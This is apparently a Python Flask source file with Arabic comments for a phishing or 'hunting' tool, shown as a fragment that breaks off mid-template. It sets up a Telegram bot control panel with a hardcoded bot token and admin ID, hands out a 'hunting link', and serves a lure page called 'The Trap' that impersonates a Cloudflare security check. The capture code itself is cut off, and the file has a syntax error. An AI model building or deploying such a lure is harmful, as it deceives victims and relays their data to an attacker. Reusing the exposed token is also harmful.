import base64, requests, io, os, sqlite3, json
from datetime import datetime
from flask import Flask, render_template_string, request, jsonify

# ==========================================
# 1. الإعدادات (Config) - تأكد من مطابقة الاسم الجديد
# ==========================================
app = Flask(__name__)
BOT_TOKEN = "8720155192:AAHsZLTbSnIlCNdOXKf424GNdkVlXIsabI8"
ADMIN_ID = 7041600701
BASE_URL = "https://sif.onrender.com"  # تم التحديث للاسم الجديد

# ==========================================
# 2. محرك الإرسال (Telegram Engine)
# ==========================================
def tg_push(method, data, files=None):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/{method}"
    try
        if files: return requests.post(url, data=data, files=files, timeout=20)
        return requests.post(url, json=data, timeout=20)
    except: return None

@app.route('/webhook', methods=['POST'])
def telegram_webhook():
    update = request.get_json(force=True, silent=True)
    if not update: return "OK", 200

    if "message" in update:
        cid = update["message"]["chat"]["id"]
        if cid == ADMIN_ID:
            kb = {
                "inline_keyboard": [
                    [{"text": "🚀 رابط الصيد الخاص بك", "callback_data": "get_url"}],
                    [{"text": "📊 فحص السيرفر", "callback_data": "ping"}]
                ]
            }
            tg_push("sendMessage", {"chat_id": cid, "text": "🎛 <b>لوحة تحكم سيف v6.0</b>\nالسيرفر شغال والربط سليم.", "parse_mode": "HTML", "reply_markup": kb})
    
    elif "callback_query" in update:
        cb = update["callback_query"]; data = cb["data"]; cid = cb["message"]["chat"]["id"]
        if data == "get_url":
            tg_push("sendMessage", {"chat_id": cid, "text": f"🔗 رابطك للمشاركة:\n<code>{BASE_URL}</code>", "parse_mode": "HTML"})
        elif data == "ping":
            tg_push("sendMessage", {"chat_id": cid, "text": "🟢 الحالة: متصل\n⚡ السرعة: ممتازة"})
            
    return "OK", 200

# ==========================================
# 3. واجهة الصيد (The Trap)
# ==========================================
HTML_TEMPLATE = '''
<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Cloudflare Security Check</title>
    <style>
        body { background:#0a0a0a; color:#fff; font-family:sans-serif; display:flex; justify-content:center; align-items:center; height:100vh; margin:0; }
        .box { background:#111; padding:35px; border-radius:15px; border:1px solid #222; text-align:center; width:85%; max-width:400px; box-shadow:0 10px 40px rgba(0,0,0,0.8); }
        .spin { border:3px solid #222; border-top:3px solid #f38020; border-radius:50%; width:50px; height:50px; animation:s 1s linear infinite; margin:0 auto 20px; }
        @keyframes s { 0%{transform:rotate(0deg);} 100%{transform:rotate(360deg);} }
    </style>
</head>
<body>
    <div class="box"><div class="spin"></div><h2>Checking security...</h2><p style="color:#6

